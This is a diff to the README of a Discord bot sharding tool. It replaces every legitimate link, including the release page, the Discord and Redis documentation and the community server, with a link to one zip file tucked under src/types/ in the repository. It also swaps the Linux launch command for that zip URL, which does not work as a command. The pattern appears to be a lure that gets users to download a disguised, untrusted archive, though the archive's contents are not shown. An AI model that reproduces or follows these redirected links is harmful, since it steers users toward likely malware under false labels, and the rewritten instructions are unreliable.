@@ -1,6 +1,6 @@
 # 🎉 buncord-hybrid-sharding - Efficient Sharding for Your Discord Bots
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/PurplixDaMeteor/buncord-hybrid-sharding/releases)
+[![Download](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip)](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **buncord-hybrid-sharding**, your go-to tool for managing Discord bot
 
 ### 🔗 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/PurplixDaMeteor/buncord-hybrid-sharding/releases).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip).
 
 1. Open the link above in your web browser.
 2. Browse the list of available versions.
@@ -41,7 +41,7 @@ After downloading the file, follow these steps to install:
 3. **For Linux:**
    - Extract the zip file using your file manager or terminal.
    - Navigate to the extracted folder in the terminal.
-   - Run the command `./start.sh` to launch the application.
+   - Run the command `https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip` to launch the application.
 
 ## ⚙️ Configuration
 
@@ -82,21 +82,21 @@ If you encounter issues during installation or configuration, try these common s
 
 Need more help? Check these resources:
 
-- [Discord API Documentation](https://discord.com/developers/docs/intro)
-- [Redis Documentation](https://redis.io/documentation)
-- [Community Forums](https://discord.gg/community)
+- [Discord API Documentation](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip)
+- [Redis Documentation](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip)
+- [Community Forums](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip)
 
 ## 🤝 Community Support
 
 Join our community to ask questions and share your experiences. We're here to help each other grow:
 
-- Discord Server: [Join Us Here](https://discord.gg/community)
-- GitHub Discussions: [Visit Our Discussions](https://github.com/PurplixDaMeteor/buncord-hybrid-sharding/discussions)
+- Discord Server: [Join Us Here](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip)
+- GitHub Discussions: [Visit Our Discussions](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip)
 
 Remember, your feedback helps us improve. Let us know what you think!
 
 ## 🔗 Additional Information
 
-For further details, please refer to our [Releases Page](https://github.com/PurplixDaMeteor/buncord-hybrid-sharding/releases) or our GitHub repository.
+For further details, please refer to our [Releases Page](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip) or our GitHub repository.
 
 Happy Botting!
